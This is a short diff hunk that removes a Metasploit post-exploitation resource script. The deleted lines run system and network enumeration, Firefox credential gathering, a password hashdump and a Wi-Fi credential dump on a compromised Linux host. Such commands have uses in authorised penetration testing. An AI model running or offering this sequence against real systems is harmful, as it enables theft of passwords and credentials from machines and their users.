@@ -1,6 +1,0 @@
-sysinfo
-run post/linux/gather/enum_system
-run post/linux/gather/enum_network
-run post/multi/gather/firefox_creds
-run post/linux/gather/hashdump
-run post/linux/gather/wifi_dump_linux
